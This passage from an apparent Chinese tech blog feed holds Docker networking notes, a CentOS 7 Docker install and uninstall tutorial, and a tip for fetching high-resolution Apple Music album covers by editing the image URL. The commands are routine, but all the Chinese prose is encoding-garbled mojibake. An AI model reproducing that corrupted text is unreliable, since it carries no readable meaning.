  disconnect  Disconnect a container from a network
  inspect     Display detailed information on one or more networks
  ls          List networks
  prune       Remove all unused networks
  rm          Remove one or more networks
  
#æŸ¥çœ‹docker ç½‘ç»œé€‚é…å™¨æ¨¡å¼
docker network ls

NETWORK ID          NAME                DRIVER              SCOPE
8c61b8c764f6        bridge              bridge              local
0fb588f08568        host                host                local
58d6ff1f424f        none                null                local
bridge		æ¡¥æ¥æ¨¡å¼
host		å…±äº«å®¿ä¸»æœºç½‘ç»œæ¨¡å¼
none		ä¸é…ç½®ç½‘ç»œ

#åˆ›å»ºdocker ç½‘ç»œé€‚é…å™¨ test-net
docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 test-net
--driver 		ç½‘ç»œé€‚é…å™¨æ¨¡å¼,é»˜è®¤ä¸ºbridge
--subnet		å­ç½‘æ©ç é…ç½®
--gateway		ç½‘å…³é…ç½®

#åˆ é™¤docker ç½‘ç»œé€‚é…å™¨ test-net
docker network rm test-net 

#ä¸ºå®¹å™¨æ·»åŠ ç½‘ç»œé€‚é…å™¨,tomcat01_birdgeçš„ç½‘ç»œé€‚é…å™¨ä¸ºé»˜è®¤docker01
docker network connect test-net tomcat01_birdge 



</code></pre>
<br>
<h2 id="docker-å…¶ä»–å‘½ä»¤">Docker å…¶ä»–å‘½ä»¤</h2>
<br>
<br>
<h3 id="docker-infoæ˜¾ç¤º-docker-ç³»ç»Ÿä¿¡æ¯åŒ…æ‹¬é•œåƒå’Œå®¹å™¨æ•°">docker info		æ˜¾ç¤º Docker ç³»ç»Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬é•œåƒå’Œå®¹å™¨æ•°</h3>
<br>
<h3 id="docker-versionæ˜¾ç¤º-docker-ç‰ˆæœ¬ä¿¡æ¯">docker version		æ˜¾ç¤º Docker ç‰ˆæœ¬ä¿¡æ¯</h3>
<br>
<h3 id="docker-statsæ˜¾ç¤ºdockerå®¹å™¨å ç”¨ç³»ç»Ÿèµ„æºæƒ…å†µ">docker stats		æ˜¾ç¤ºDockerå®¹å™¨å ç”¨ç³»ç»Ÿèµ„æºæƒ…å†µ</h3>
<br>
<h3 id="docker-loginç™»å½•docker">docker login		ç™»å½•Docker</h3>
<pre><code class="language-shell">docker login -u &quot;ä½ çš„ç”¨æˆ·å&quot; -p &quot;ä½ çš„å¯†ç &quot;
</code></pre>
<br>
<h3 id="docker-logouté€€å‡ºdocker">docker logout		é€€å‡ºDocker</h3>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Dockerä¿å§†çº§æ•™ç¨‹ : Install Docker]]></title>
        <id>https://M0kY4n.github.io/Websec/post/docker-an-zhuang-jiao-cheng/</id>
        <link href="https://M0kY4n.github.io/Websec/post/docker-an-zhuang-jiao-cheng/">
        </link>
        <updated>2020-06-27T03:48:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="dockerå®‰è£…æ•™ç¨‹">Dockerå®‰è£…æ•™ç¨‹</h1>
<blockquote>
<p>Dockerå®˜æ–¹æ‰‹å†Œ :https://docs.docker.com/</p>
</blockquote>
<br>
<h2 id="ç³»ç»Ÿç¯å¢ƒ">ç³»ç»Ÿç¯å¢ƒ</h2>
<blockquote>
<p>æ­¤æ–‡ç« æ¼”ç¤ºçš„ç‰ˆæœ¬ä¸ºLinuxç‰ˆæœ¬,ç³»ç»Ÿä¸ºCentOS 7,å®˜æ–¹æ‰‹å†Œæ˜ç¡®è¯´æ˜:</p>
<p>â€‹	è‹¥è¦åœ¨CentOSä¸Šå®‰è£…Docker,åˆ™éœ€è¦ä¸€ä¸ªCentOS 7çš„ç»´æŠ¤ç‰ˆæœ¬ã€‚ä¸æ”¯æŒæˆ–æœªæµ‹è¯•å­˜æ¡£ç‰ˆæœ¬ã€‚</p>
</blockquote>
<pre><code class="language-shell">#ç³»ç»Ÿç‰ˆæœ¬ä¿¡æ¯
[root@localhost ~]# cat /etc/os-release 
NAME=&quot;CentOS Linux&quot;
VERSION=&quot;7 (Core)&quot;
ID=&quot;centos&quot;
ID_LIKE=&quot;rhel fedora&quot;
VERSION_ID=&quot;7&quot;
PRETTY_NAME=&quot;CentOS Linux 7 (Core)&quot;
ANSI_COLOR=&quot;0;31&quot;
CPE_NAME=&quot;cpe:/o:centos:centos:7&quot;
HOME_URL=&quot;https://www.centos.org/&quot;
BUG_REPORT_URL=&quot;https://bugs.centos.org/&quot;

CENTOS_MANTISBT_PROJECT=&quot;CentOS-7&quot;
CENTOS_MANTISBT_PROJECT_VERSION=&quot;7&quot;
REDHAT_SUPPORT_PRODUCT=&quot;centos&quot;
REDHAT_SUPPORT_PRODUCT_VERSION=&quot;7&quot;

</code></pre>
<p>å®‰è£…ä¹‹å‰ç¡®ä¿ç³»ç»Ÿæ²¡æœ‰å®‰è£…è¿‡æ—§ç‰ˆæœ¬çš„Docker,è‹¥æœ‰å®‰è£…æ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¸è½½æ—§ç‰ˆæœ¬çš„Docker</p>
<pre><code class="language-shell">$ sudo yum remove docker \
                  docker-client \
                  docker-client-latest \
                  docker-common \
                  docker-latest \
                  docker-latest-logrotate \
                  docker-logrotate \
                  docker-engine
                  
</code></pre>
<br>
<br>
<h2 id="å®‰è£…docker">å®‰è£…Docker</h2>
<blockquote>
<p>å®‰è£…Dockerä¹‹å‰,éœ€è¦è®¾ç½®Dockerå­˜å‚¨åº“</p>
</blockquote>
<pre><code class="language-shell">#è®¾ç½®å­˜å‚¨åº“éœ€å®‰è£…yum-utilsåŒ…
yum install -y yum-utils

#è®¾ç½®å­˜å‚¨åº“ , é»˜è®¤ä¸ºå®˜æ–¹å›½å¤–åœ°å€!!!,è‹¥ç½‘ç»œçŠ¶æ€ä¸å¥½è¯·è‡ªè¡Œæ›´æ¢å›½å†…æº
yum-config-manager \
    --add-repo \
    https://download.docker.com/linux/centos/docker-ce.repo    
    
#æ›´æ–°æº
yum makecache fast

</code></pre>
<blockquote>
<p>å®‰è£…Docker</p>
</blockquote>
<pre><code class="language-shell"> #å®‰è£…æœ€æ–°çš„Docker
 yum -y install docker-ce docker-ce-cli containerd.io
 
</code></pre>
<br>
<br>
<h2 id="å¯åŠ¨è¿è¡Œ-docker">å¯åŠ¨&amp;è¿è¡Œ Docker</h2>
<pre><code class="language-shell">#å¯åŠ¨Docker
systemctl start docker

#è¿è¡ŒHello-worldé•œåƒæ¥æµ‹è¯•æ˜¯å¦æ­£ç¡®å®‰è£…äº†Docker
docker run hello-world

#æ˜¾ç¤ºä»¥ä¸‹ä¿¡æ¯åˆ™æ­£ç¡®å®‰è£…äº†Docker

Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/

</code></pre>
<br>
<br>
<h2 id="å¸è½½docker">å¸è½½Docker</h2>
<pre><code class="language-shell">#å¸è½½Docker
yum remove docker-ce docker-ce-cli containerd.io

#åˆ é™¤ä¸»æœºä¸Šçš„æ®‹ä½™æ–‡ä»¶(é•œåƒ,å®¹å™¨,é…ç½®æ–‡ä»¶ç­‰ç­‰)
rm -rf /var/lib/docker
</code></pre>
<br>
<br>
<h1 id="é…ç½®å›½å†…é•œåƒåŠ é€Ÿ">é…ç½®å›½å†…é•œåƒåŠ é€Ÿ</h1>
<blockquote>
<p>ä½¿ç”¨å›½å†…é•œåƒåŠ é€Ÿèƒ½æ›´å¿«çš„ä¸‹è½½é•œåƒ,è¿™é‡Œä»¥è…¾è®¯äº‘ä¸ºä¾‹,å…¶ä»–è¿è¡Œå•†è¯·è‡ªè¡Œæ‰¾åˆ°å„è‡ªçš„æ–‡æ¡£è¿›è¡Œé…ç½®</p>
</blockquote>
<pre><code class="language-shell">#æ‰“å¼€ /etc/docker/daemon.json é…ç½®æ–‡ä»¶(è¿™ä¸ªæ–‡ä»¶æ˜¯æœ¬èº«æ˜¯ä¸å­˜åœ¨çš„,åªæ˜¯é€šè¿‡vimåˆ›å»º-ç¼–è¾‘-ä¿å­˜-ç”Ÿæˆ)
vim /etc/docker/daemon.json

#è¿›å…¥vimçš„ç¼–è¾‘æ¨¡å¼,æ·»åŠ ä¸€ä¸‹å†…å®¹,å¹¶ä¿å­˜
{
&quot;registry-mirrors&quot;: [&quot;https://mirror.ccs.tencentyun.com&quot;]
}

#é‡æ–°åŠ è½½æœåŠ¡é…ç½®æ–‡ä»¶
systemctl daemon-reload 

#é‡å¯Dockerè¿›ç¨‹
systemctl restart docker
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ä¸Šç½‘å†²æµªå°æŠ€å·§â€”â€”ä¸‹è½½é«˜æ¸…ä¸“è¾‘å°é¢]]></title>
        <id>https://M0kY4n.github.io/Websec/post/gao-qing-zhuan-ji-feng-mian/</id>
        <link href="https://M0kY4n.github.io/Websec/post/gao-qing-zhuan-ji-feng-mian/">
        </link>
        <updated>2020-06-23T18:21:46.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>è¯´æ˜:å¹¶éæ‰€æœ‰ä¸“è¾‘éƒ½æ”¶å½•ä¸”å¹¶éæ‰€æœ‰ä¸“è¾‘èƒ½ä¸‹è½½åˆ°é«˜æ¸…</p>
<p>å¼€å§‹ä¹‹å‰,å…ˆå–Šè‹¹æœç‰›é€¼!!!è‹¹æœæ°¸è¿œæ»´ç¥!!!</p>
</blockquote>
<br>
# æœç´¢ä¸“è¾‘
<p>æ‰“å¼€ç½‘ç«™ https://music.apple.com/cn/browse<br>
ç‚¹å‡»æœç´¢æ ,è¾“å…¥æƒ³è¦æœç´¢çš„ä¸“è¾‘(å¹¶éæ”¶å½•æ‰€æœ‰ä¸“è¾‘,æ‰€ä»¥å¯èƒ½å­˜åœ¨æ‰¾ä¸åˆ°ä¸“è¾‘çš„æƒ…å†µ),è¿™é‡Œä»¥&quot;Shigaçš„ã€Šå¤§äº†ä¸€å²ã€‹â€œä¸ºä¾‹</p>
<figure data-type="image" tabindex="1"><img src="https://file.moetu.org/images/2020/06/24/image-20200624013925007546db20cf0e3d4fa.png" alt="æœç´¢ç»“æœ" loading="lazy"></figure>
<br>
<h1 id="è·å–ä¸“è¾‘å°é¢url">è·å–ä¸“è¾‘å°é¢URL</h1>
<h2 id="1å³å‡»è·å–ä¸“è¾‘å°é¢url">1,å³å‡»è·å–ä¸“è¾‘å°é¢URL</h2>
<p>å³å‡»ä¸“è¾‘å°é¢å›¾,é€‰æ‹©â€œå¤åˆ¶å›¾ç‰‡åœ°å€â€æˆ–è€…â€œåœ¨æ–°æ ‡ç­¾é¡µä¸­æ‰“å¼€å›¾ç‰‡â€</p>
<figure data-type="image" tabindex="2"><img src="https://file.moetu.org/images/2020/06/24/image-202006240142075745292874e747cf154.png" alt="å³å‡»èœå•" loading="lazy"></figure>
<h2 id="2é€šè¿‡document-elementä¸“è¾‘å°é¢url">2.é€šè¿‡Document Elementä¸“è¾‘å°é¢URL</h2>
<p>è¾“å…¥â€œF12â€æ‰“å¼€å¼€å‘è€…å·¥å…·ï¼Œè¾“å…¥â€œCtrl+Shift+Câ€ï¼Œé€‰ä¸­å¹¶ç‚¹å‡»ä¸“è¾‘å°é¢</p>
<figure data-type="image" tabindex="3"><img src="https://file.moetu.org/images/2020/06/24/image-202006240148176464ca238639c766293.png" alt="é€‰ä¸­å›¾ç‰‡" loading="lazy"></figure>
<p>åœ¨HTMLä»£ç ä¸­æ‰¾åˆ°ä¸“è¾‘å°é¢URL</p>
<figure data-type="image" tabindex="4"><img src="https://file.moetu.org/images/2020/06/24/image-202006240152207087321254865fd4b75.png" alt="ä¸“è¾‘å°é¢URL" loading="lazy"></figure>
<h2 id="3ä¿®æ”¹ä¸“è¾‘å°é¢urlè·å–é«˜æ¸…ä¸“è¾‘å°é¢">3.ä¿®æ”¹ä¸“è¾‘å°é¢URLè·å–é«˜æ¸…ä¸“è¾‘å°é¢</h2>
<p>è§‚å¯Ÿä¸“è¾‘å°é¢URLçš„åœ°å€,ä¸åŒåˆ†è¾¨ç‡,URLä¹Ÿè·Ÿç€å˜åŒ–</p>
<pre><code class="language-shell"># 1000wçš„åˆ†å½•ç‡,URLæœ€åçš„1000x1000bb.jpg
https://is2-ssl.mzstatic.com/image/thumb/Music49/v4/2a/9e/37/2a9e371c-e1e8-b89e-5d79-63ddc1b2039e/825646018468.jpg/1000x1000bb.jpg  
</code></pre>
<p>æ‰€ä»¥,å°†URLæœ€åçš„ XXX * XXXbb.jpg å°†XXXå¢å¤§,å°é¢çš„æ¸…æ™°åº¦éšç€XXXå¢å¤§è€Œæ¸…æ™°,è¿™é‡Œæˆ‘ä»¬å°†XXXè®¾ç½®ä¸º5000</p>
<p>åˆ™ä¸“è¾‘å°é¢URLä¸º</p>
<pre><code class="language-shell">https://is2-ssl.mzstatic.com/image/thumb/Music49/v4/2a/9e/37/2a9e371c-e1e8-b89e-5d79-63ddc1b2039e/825646018468.jpg/5000x5000bb.jpg
</code></pre>
<p>ä¿®æ”¹åå›è½¦è®¿é—®,å›¾ç‰‡ä¼šé‡æ–°åŠ è½½,å¯è§éšç€åˆ†è¾¨ç‡å¢å¤§,å›¾ç‰‡åŠ è½½é€Ÿåº¦å˜æ…¢</p>
<figure data-type="image" tabindex="5"><img src="https://file.moetu.org/images/2020/06/24/image-20200624015819987185234ba096f4a89.png" alt="åŠ è½½å›¾ç‰‡" loading="lazy"></figure>
<p>åŠ è½½å®Œæ¯•å,å¯ç”¨é¼ æ ‡å•å‡»ç¼©æ”¾å›¾ç‰‡</p>
<figure data-type="image" tabindex="6"><img src="https://file.moetu.org/images/2020/06/24/image-20200624020026662ed44e78bcd43cf0f.png" alt="ç¼©æ”¾å›¾ç‰‡" loading="lazy"></figure>
<p>å°†å›¾ç‰‡ä¸‹è½½ä¸‹æ¥,æŸ¥çœ‹å±æ€§å‘ç°å›¾ç‰‡åˆ†è¾¨ç‡å¹¶ä¸æ˜¯5000x5000.è€Œæ˜¯4000x4000çš„!!æ‰€ä»¥åŸºæœ¬ç¡®å®š4000æ˜¯æœåŠ¡å™¨ä¸Šæœ€å¤§åˆ†è¾¨ç‡,æ‰€ä»¥ä¸‹è½½ä¸“è¾‘å°é¢çš„æ—¶å€™,å°½é‡å°†URLçš„åˆ†è¾¨ç‡æ•°å€¼è®¾å¤§,è®©æœåŠ¡å™¨ä»¥æœ€å¤§åˆ†è¾¨ç‡è§£æ</p>
<figure data-type="image" tabindex="7"><a href="https://moetu.org/image/7dAOY"><img src="https://file.moetu.org/images/2020/06/24/_2020062402064732b6748dd71ebbb4.png" alt="æ–‡ä»¶å±æ€§" loading="lazy"></a></figure>
<br>
<h2 id="æ€»ç»“">æ€»ç»“</h2>
<ol>
<li>Apple Musicå¹¶éæ”¶å½•æ‰€æœ‰ä¸“è¾‘,æ‰€ä»¥ä¼šå­˜åœ¨æ‰¾ä¸åˆ°ä¸“è¾‘çš„æƒ…å†µ</li>
<li>Apple Musicçš„ä¸“è¾‘å°é¢åˆ†è¾¨ç‡æ˜¯å›ºå®šçš„,ä¸‹è½½ä¸“è¾‘å°é¢çš„æ—¶å€™,å°½é‡å°†URLçš„åˆ†è¾¨ç‡æ•°å€¼è®¾å¤§,è®©æœåŠ¡å™¨ä»¥æœ€å¤§åˆ†è¾¨ç‡è§£æ</li>
<li>Apple Musicå±äºå›½å¤–ç½‘ç«™,å›½å†…ç½‘ç»œçŠ¶æ€è¾ƒå·®çš„,è¯·è‡ªè¡Œç§‘å­¦ä¸Šç½‘è®¿é—®<br>
<br></li>
</ol>
<h2 id="ä¸“è¾‘å°é¢">ä¸“è¾‘å°é¢</h2>
<figure data-type="image" tabindex="8"><img src="https://file.moetu.org/images/2020/06/24/5000x5000bb7f1d2a647178de79.jpg" alt="Shigaã€Šå¤§äº†ä¸€å²ã€‹å°é¢" loading="lazy"></figure>
]]></content>
    </entry>
</feed>